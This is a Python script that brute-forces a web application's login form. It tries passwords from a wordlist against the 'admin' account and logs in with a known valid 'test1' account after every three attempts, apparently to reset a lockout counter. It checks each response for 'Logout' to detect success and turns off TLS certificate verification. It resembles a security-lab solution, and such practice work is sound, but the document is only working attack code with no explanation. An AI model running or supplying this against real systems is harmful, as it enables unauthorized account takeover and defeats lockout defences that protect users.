import requests
import sys
import urllib3
import re 
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def runOkie():
    with open('password', 'r') as file:
        lines = file.readlines()
    index = 0 
    count = 0

    while index < len(lines):
        password= lines[index].strip()
        print(f"Count : {count}")
        if count < 3:
            data = {'username' : 'admin', 'password' : password}
            count = count + 1
            index += 1
        elif count == 3 :
            data = {'username' : 'test1', 'password' : 'test123'}
            count = 0
        print("this is the selected data", data)
        r = s.post(url, data, verify=False)
        print("this is the response from the server", r.text)
        soup = BeautifulSoup(r.text, 'html.parser')
        checkData = soup.find(string=re.compile("Logout", re.IGNORECASE))
        if checkData:
            if data['username'] == 'admin':
                print(f"{index} finally got data : {data}")
                break
            else:
                continue
        else:
            print(f"{index} failed to get the data : {data}")
            continue;
    

def brute_force_login(s, url):
    data = {
        'username' : 'test1',
        'password' : 'test123'
    }

    r = s.post(url, data, verify=False)
    print("this is hte data", r.text)
    soup = BeautifulSoup(r.text, 'html.parser')
    checkData = soup.find(string=re.compile('Logout', re.IGNORECASE))
    print("this is the check data ", checkData)





if __name__=="__main__":
    if len(sys.argv) != 2:
        print("Usage : python3 brute_force.py <url>")
    else:
        url = sys.argv[1].strip()
        s = requests.Session()
        # brute_force_login(s, url)
        runOkie();